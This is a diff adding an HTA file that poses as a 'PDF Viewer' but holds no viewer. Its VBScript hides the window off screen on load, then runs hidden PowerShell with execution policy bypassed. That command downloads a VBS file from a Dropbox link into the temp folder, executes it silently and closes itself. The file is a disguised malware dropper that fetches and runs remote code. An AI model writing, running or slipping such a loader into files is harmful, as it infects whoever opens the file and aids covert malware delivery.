@@ -1,0 +1,44 @@
+<html>
+<head>
+<title>PDF Viewer</title>
+<hta:application
+    id="pdfViewer"
+    applicationname="PDF Viewer"
+    border="none"
+    borderstyle="normal"
+    caption="no"
+    contextmenu="no"
+    innerborder="no"
+    maximizebutton="no"
+    minimizebutton="no"
+    navigable="no"
+    scroll="no"
+    selection="no"
+    showintaskbar="no"
+    singleinstance="yes"
+    sysmenu="no"
+    version="1.0"
+    windowstate="minimize"
+/>
+<script language="VBScript">
+    Sub Window_OnLoad
+        ' Hide the window immediately
+        window.resizeTo 1, 1
+        window.moveTo -2000, -2000
+        
+        ' Run the PowerShell command hidden
+        Set objShell = CreateObject("WScript.Shell")
+        objShell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command " & _
+            """Invoke-WebRequest -Uri 'https://www.dropbox.com/scl/fi/zml5yox7saix5i6ivmblt/runscript.vbs?rlkey=g2ogfbm6uwl7a1pa2vxhluwni&st=nw56htuz&dl=1' " & _
+            "-OutFile ($env:TEMP + '\runscript.vbs'); " & _
+            "if (Test-Path ($env:TEMP + '\runscript.vbs')) { " & _
+            "wscript.exe //B ($env:TEMP + '\runscript.vbs') }""", 0, False
+        
+        ' Close this HTA
+        window.close()
+    End Sub
+</script>
+</head>
+<body>
+</body>
+</html>
